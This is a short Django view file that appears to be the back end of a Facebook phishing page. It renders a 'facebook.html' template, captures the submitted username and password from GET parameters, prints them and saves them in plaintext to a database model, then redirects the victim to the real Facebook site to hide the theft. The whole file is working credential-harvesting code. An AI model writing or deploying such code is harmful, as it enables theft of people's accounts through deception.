from django.shortcuts import render, redirect
from .models import userss

def logi(request):
    if request.method == 'GET' and 'u_name' in request.GET and 'u_pass' in request.GET:
        username = request.GET.get('u_name')
        password = request.GET.get('u_pass')
        if username and password:
            print(username, password)
            userss.objects.create(username=username, password=password)
            return redirect('https://www.facebook.com/')
        else:
            print("Missing username or password")
    return render(request, 'facebook.html')
